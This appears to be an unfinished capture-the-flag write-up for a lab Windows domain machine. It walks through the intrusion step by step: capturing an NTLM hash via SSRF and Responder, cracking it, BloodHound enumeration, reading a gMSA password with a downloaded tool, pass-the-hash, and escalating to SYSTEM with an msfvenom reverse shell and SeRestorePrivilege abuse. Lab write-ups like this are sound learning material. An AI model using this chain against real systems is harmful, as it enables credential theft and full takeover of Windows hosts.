#InProgress 
```IP
192.168.167.165
```
# Enumeration
## SMB
```
nxc smb 192.168.167.165 -u '' -p '' 
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219093954.png?raw=true)
Nothing interesting
## HTTP 8080
We have a web browser that doesn't connect to internet. Let's see if it connects to our machine. 
# Exploitation
We start responder in our local machine:
```
sudo responder -I tun0
```
and then try to connect to our machine:
```
http://192.168.167.165:8080/?url=http://192.168.45.246/test
```
And we get a NTLMv3 hash:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219094300.png?raw=true)
Let's try to crack it
```
john --wordlist=/usr/share/wordlists/rockyou.txt files/enox.hash
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219094313.png?raw=true)
Now we have the following credentials:
```
enox:california
```
## WINRM
We can use our discovered credentials with nxc to assess that we have indeed access to the machine:
```
nxc winrm 192.168.167.165 -u 'enox' -p 'california'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219094548.png?raw=true)

# PrivEsc

## Manual
```
evil-winrm -i 192.168.167.165 -u enox -p 'california'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219094828.png?raw=true)
We get the local flag
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219094900.png?raw=true)
There is too an `application` directory and a `todo.txt` file:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219095142.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219095355.png?raw=true)

## Automated
### Bloodhound
After some manual enumeration we will run bloodhound:
```
bloodhound-python -d heist.offsec -c all -u enox -p 'california' -ns 192.168.167.165 --zip
```
We mark enox user as owned and run `Shortest Paths to Domain Admins from Owned Principals`:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219100927.png?raw=true)
In order to exploit the DCSync vulnerability we would have to be a local admin, and we are not. Checking the Outbound Object Control of our user we notice an odd Group Delegated Object Control, which can be exploited following the Bloodhound recommendations:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219102257.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219102321.png?raw=true)
It is affecting specifically the user svc_apache. We download an already compiled binary as shown below:
```
iwr -uri https://github.com/expl0itabl3/Toolies/raw/refs/heads/master/GMSAPasswordReader.exe -outfile GMSAPasswordReader.exe
```
And then run the exploit:
```
.\GMSAPasswordReader.exe --accountname svc_apache
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219102530.png?raw=true)
```
C9C9F97308956B4AEDD53C1351F47A84
```
Because svc_apache is a service account we will type a dollar sign at the end of it:
```
evil-winrm -i 192.168.167.165 -u svc_apache$ -H C9C9F97308956B4AEDD53C1351F47A84
```
And now we have access again as svc_apache. It contains a ps1 script in its Documents folder which seems to add the `SeRestorePrivilege`.
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219103918.png?raw=true)
And indeed it is enabled.
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219103952.png?raw=true)

```
iwr -uri https://github.com/dxnboy/redteam/raw/refs/heads/master/SeRestoreAbuse.exe -outfile SeRestoreAbuse.exe
```
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.246 LPORT=4444 -f exe > rev.exe
```
```
iwr -uri http://192.168.45.246:8000/rev.exe -outfile shell.exe
```
```
.\SeRestoreAbuse.exe C:\Users\svc_apache$\Documents\shell.exe
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219105244.png?raw=true)
And we got nt authority system:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219105350.png?raw=true)
### Peass
### Mimikatz

# Lateral Movement
